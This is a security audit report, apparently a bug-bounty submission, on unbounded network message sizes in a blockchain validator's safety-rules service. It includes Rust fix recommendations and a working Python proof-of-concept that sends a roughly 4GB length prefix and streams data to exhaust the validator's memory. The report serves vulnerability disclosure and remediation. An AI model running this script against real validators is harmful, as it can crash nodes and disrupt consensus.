# Audit Report

## Title
Memory Exhaustion Attack on Safety-Rules Service via Unbounded Message Size in Network Deserialization

## Summary
The `handle_message()` function in the safety-rules serializer accepts arbitrarily large network messages without size validation before deserialization. Combined with the underlying `NetworkStream` implementation that lacks maximum message size limits, an attacker can send malicious messages with length prefixes up to 4GB, causing memory exhaustion and validator node crashes.

## Finding Description

The vulnerability exists in a multi-layer failure in input validation:

**Layer 1 - Application Layer:** The `handle_message()` function directly deserializes incoming network messages without validating their size. [1](#0-0) 

**Layer 2 - Network Layer:** The `NetworkStream::read_buffer()` function reads a 4-byte length prefix as a `u32`, converts it to `usize`, and attempts to allocate a vector of that size without any bounds checking. [2](#0-1) 

The vulnerability is exploited through this attack path:

1. Safety-rules service is configured as `SafetyRulesService::Process` (allowed in testnet/devnet configurations)
2. Service listens on a TCP socket defined by `server_address` in configuration
3. Attacker connects to the TCP port and sends a crafted message:
   - 4-byte length prefix: `0xFFFFFFFE` (u32::MAX - 1 = ~4GB)
   - Followed by actual data (attacker can stream gigabytes)
4. `NetworkStream::read()` continuously buffers incoming data via `self.buffer.extend()` until 4GB is accumulated
5. `read_buffer()` allocates another ~4GB vector to return the data
6. Total memory consumption: ~8GB for a single malicious message
7. Validator node experiences memory exhaustion, crashes, or becomes unresponsive [3](#0-2) 

The remote service directly passes network data to `handle_message()` without intermediate size validation.

**No Authentication:** The `NetworkServer`/`NetworkClient` implementation lacks any authentication mechanism, allowing any network peer to connect and send messages. A grep search confirms zero authentication checks in the secure/net library.

**Configuration Risk:** While mainnet validators are recommended to use `SafetyRulesService::Local`, the Process mode exists and can be configured with any listen address. [4](#0-3) 

The configuration sanitizer only warns about performance, not security implications.

## Impact Explanation

**Severity: High**

This vulnerability meets the High Severity criteria from the Aptos bug bounty program: "Validator node slowdowns, API crashes."

**Specific Impacts:**

1. **Validator Node Crash:** Memory exhaustion forces the validator process to crash or be killed by the OS
2. **Denial of Service:** Even without crashing, the node becomes unresponsive during the multi-GB memory allocation
3. **Consensus Liveness Attack:** Safety-rules service is critical for consensus participation - a crashed service prevents the validator from signing proposals, votes, and timeouts
4. **Multi-Validator Attack:** If multiple validators are misconfigured to expose this service, coordinated attacks could impact network liveness

**Invariant Violations:**

- **Resource Limits Invariant:** "All operations must respect gas, storage, and computational limits" - violated by unbounded memory allocation
- **Consensus Safety/Liveness:** Crashed validators cannot participate in consensus, reducing the active validator set

The attack requires no privileged access, only network connectivity to the safety-rules port. In misconfigured deployments (non-localhost binding, firewall misconfigurations), this becomes remotely exploitable.

## Likelihood Explanation

**Likelihood: Medium-High in vulnerable configurations**

**Factors Increasing Likelihood:**

1. **Simple Exploitation:** Attack requires only basic TCP socket programming
2. **No Authentication:** No credentials needed to send malicious messages
3. **Deterministic Impact:** Sending a 4GB length prefix always causes memory exhaustion
4. **Configuration Exists:** Process mode is implemented and usable, even if not recommended for mainnet

**Factors Decreasing Likelihood:**

1. **Mainnet Mitigation:** Mainnet validators are recommended to use Local mode
2. **Localhost Default:** Example configurations show `127.0.0.1` binding
3. **Requires Misconfiguration:** Validator must bind to non-localhost address and expose port

**Realistic Attack Scenarios:**

- **Testnet/Devnet:** Networks using Process mode for testing/debugging purposes
- **Misconfigured Validators:** Operators who don't follow mainnet best practices
- **Internal Network Attacks:** Attacker gains access to validator's internal network
- **Configuration Errors:** Accidental exposure through firewall misconfiguration

## Recommendation

Implement multi-layer size validation:

**1. Network Layer - Add Maximum Message Size Constant:**

```rust
// In secure/net/src/lib.rs
const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024; // 64 MiB, matching main network config

fn read_buffer(&mut self) -> Vec<u8> {
    if self.buffer.len() < 4 {
        return Vec::new();
    }

    let mut u32_bytes = [0; 4];
    u32_bytes.copy_from_slice(&self.buffer[..4]);
    let data_size = u32::from_le_bytes(u32_bytes) as usize;
    
    // SECURITY: Validate message size before allocation
    if data_size > MAX_MESSAGE_SIZE {
        // Clear buffer and return error via panic or return Result type
        self.buffer.clear();
        return Vec::new(); // Or change signature to Result<Vec<u8>, Error>
    }

    let remaining_data = &self.buffer[4..];
    if remaining_data.len() < data_size {
        return Vec::new();
    }

    let returnable_data = remaining_data[..data_size].to_vec();
    self.buffer = remaining_data[data_size..].to_vec();
    returnable_data
}
```

**2. Application Layer - Add Size Check:**

```rust
// In consensus/safety-rules/src/serializer.rs
const MAX_SAFETY_RULES_MESSAGE_SIZE: usize = 10 * 1024 * 1024; // 10 MiB

pub fn handle_message(&mut self, input_message: Vec<u8>) -> Result<Vec<u8>, Error> {
    // SECURITY: Validate input size before deserialization
    if input_message.len() > MAX_SAFETY_RULES_MESSAGE_SIZE {
        return Err(Error::DeserializationError(format!(
            "Message too large: {} bytes exceeds maximum of {} bytes",
            input_message.len(),
            MAX_SAFETY_RULES_MESSAGE_SIZE
        )));
    }
    
    let input = serde_json::from_slice(&input_message)?;
    // ... rest of function
}
```

**3. Configuration Validation - Enforce Localhost Binding:**

Add validation in `SafetyRulesConfig::sanitize()` to ensure Process mode only binds to localhost addresses, or add a separate security check.

## Proof of Concept

**Attack Script (Python):**

```python
#!/usr/bin/env python3
import socket
import struct
import time

# Target: Safety-rules service configured with Process mode
TARGET_HOST = "validator.example.com"  # Or 127.0.0.1 if testing locally
TARGET_PORT = 5555  # Default from example config

def exploit_memory_exhaustion():
    """
    Send a malicious message with 4GB length prefix to cause memory exhaustion
    """
    print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TARGET_HOST, TARGET_PORT))
    print("[+] Connected")
    
    # Send length prefix claiming 4GB message
    malicious_size = 0xFFFFFFFE  # u32::MAX - 1 (~4GB)
    length_prefix = struct.pack('<I', malicious_size)
    
    print(f"[*] Sending length prefix: {malicious_size} bytes ({malicious_size / (1024**3):.2f} GB)")
    sock.send(length_prefix)
    
    # Send actual data in chunks to trigger memory accumulation
    chunk_size = 1024 * 1024  # 1MB chunks
    total_sent = 0
    
    print("[*] Streaming malicious data...")
    try:
        while total_sent < malicious_size:
            chunk = b'A' * min(chunk_size, malicious_size - total_sent)
            sock.send(chunk)
            total_sent += len(chunk)
            
            if total_sent % (100 * 1024 * 1024) == 0:  # Print every 100MB
                print(f"[*] Sent {total_sent / (1024**3):.2f} GB / {malicious_size / (1024**3):.2f} GB")
            
            time.sleep(0.001)  # Small delay to avoid network congestion
    except Exception as e:
        print(f"[!] Connection error (target may have crashed): {e}")
    
    sock.close()
    print("[+] Attack complete - Target validator should be experiencing memory exhaustion")

if __name__ == "__main__":
    exploit_memory_exhaustion()
```

**Testing Instructions:**

1. Configure a test validator with `SafetyRulesService::Process` mode
2. Set `server_address: "/ip4/127.0.0.1/tcp/5555"` in config
3. Start the validator
4. Run the exploit script against port 5555
5. Monitor validator memory usage (should spike to multi-GB)
6. Observe validator crash or unresponsiveness

**Expected Result:** Validator node memory consumption increases dramatically, potentially causing OOM kill or system instability. Safety-rules service becomes unable to process legitimate consensus messages.

### Citations

**File:** consensus/safety-rules/src/serializer.rs (L45-46)
```rust
    pub fn handle_message(&mut self, input_message: Vec<u8>) -> Result<Vec<u8>, Error> {
        let input = serde_json::from_slice(&input_message)?;
```

**File:** secure/net/src/lib.rs (L479-496)
```rust
    fn read_buffer(&mut self) -> Vec<u8> {
        if self.buffer.len() < 4 {
            return Vec::new();
        }

        let mut u32_bytes = [0; 4];
        u32_bytes.copy_from_slice(&self.buffer[..4]);
        let data_size = u32::from_le_bytes(u32_bytes) as usize;

        let remaining_data = &self.buffer[4..];
        if remaining_data.len() < data_size {
            return Vec::new();
        }

        let returnable_data = remaining_data[..data_size].to_vec();
        self.buffer = remaining_data[data_size..].to_vec();
        returnable_data
    }
```

**File:** consensus/safety-rules/src/remote_service.rs (L47-55)
```rust
fn process_one_message(
    network_server: &mut NetworkServer,
    serializer_service: &mut SerializerService,
) -> Result<(), Error> {
    let request = network_server.read()?;
    let response = serializer_service.handle_message(request)?;
    network_server.write(&response)?;
    Ok(())
}
```

**File:** config/src/config/safety_rules_config.rs (L98-104)
```rust
            // Verify that the safety rules service is set to local for optimal performance
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }
```
